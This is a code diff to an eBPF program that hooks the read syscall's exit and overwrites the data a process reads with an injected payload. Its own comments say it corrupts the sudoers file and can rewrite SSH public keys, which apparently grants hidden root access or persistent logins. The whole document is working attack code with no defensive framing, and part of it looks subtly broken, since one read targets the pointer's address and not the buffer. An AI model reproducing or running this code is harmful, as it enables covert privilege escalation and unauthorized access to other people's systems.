@@ -58,11 +58,12 @@ int handle_read_exit(struct trace_event_raw_sys_exit *ctx)
     // This sorta corrupts the sudoers file, but everything still
     // works as expected
     // char local_buff[max_payload_len] = { 0x00 };
-    char local_buff[max_payload_len] = (char *)bpf_map_lookup_elem(&map_payload_buffer, 1);
+    size_t key = 0;
+    char *local_buff = (char *)bpf_map_lookup_elem(&map_payload_buffer, &key);
     bpf_probe_read(&local_buff, max_payload_len, (void*)buff_addr);
     for (unsigned int i = 0; i < max_payload_len; i++) {
         if (i >= payload_len) {
-            local_buff[i] = '\n';
+            local_buff[i] = ' ';
         }
         else {
             local_buff[i] = payload[i];
@@ -81,5 +82,6 @@ int handle_read_exit(struct trace_event_raw_sys_exit *ctx)
         bpf_get_current_comm(&e->comm, sizeof(e->comm));
         bpf_ringbuf_submit(e, 0);
     }
+    // There need bpf delete the pid in maps to avoid the rewrite the others ssh pub keys.
     return 0;
 }
